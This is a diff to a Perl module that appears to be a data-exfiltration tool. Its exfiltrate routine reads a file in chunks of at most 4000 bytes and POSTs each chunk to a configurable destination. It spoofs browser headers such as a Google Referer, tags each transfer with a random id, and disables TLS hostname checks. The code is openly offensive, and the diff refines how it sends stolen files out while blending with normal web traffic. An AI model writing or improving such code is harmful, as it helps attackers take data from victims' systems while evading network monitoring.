@@ -13,8 +13,9 @@ use Readonly;
 use Term::ProgressBar;
 
 Readonly my $START_TRANSFER => 1;
-Readonly my $IN_TRANSFER => 0;
-Readonly my $END_TRANSFER => -1;
+Readonly my $IN_TRANSFER    => 0;
+Readonly my $END_TRANSFER   => -1;
+Readonly my $LIMIT_TRANFER   => 4000;
 
 sub setHeader {
     my($req) = @_;
@@ -26,6 +27,7 @@ sub setHeader {
     $req->header('Referer' => 'https://google.com/');
     $req->header('DNT' => '1');
     $req->header('Cache-Control' => 'max-age=0');
+    $req->header('If-SSL-Cert-Subject' => '/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd');
 }
 
 sub sendData {
@@ -48,8 +50,8 @@ sub sendData {
 
 sub exfiltrate {
     my($self, $file) = @_;
-    my($data, $n, $count);
-    my $userAgent = new LWP::UserAgent;
+    my($data, $n, $count, $size);
+    my $userAgent = new LWP::UserAgent(ssl_opts => { verify_hostname => 0 });
     my $request = new HTTP::Request 'POST' => $self->dest;
     my $id = int(rand(100000)) + int(rand(100));
 
@@ -63,7 +65,8 @@ sub exfiltrate {
     sendData($self, $request, $userAgent, $file, '', $id, $START_TRANSFER);
 
     $count = 0;
-    while (($n = read $self->file, $data, $self->size) != 0) {
+    $size = $self->size <= $LIMIT_TRANFER ? $self->size : $LIMIT_TRANFER;
+    while (($n = read $self->file, $data, $size) != 0) {
         $count += $n;
         sendData($self, $request, $userAgent, $file, $data, $id, $IN_TRANSFER);
         $progress->update($count);
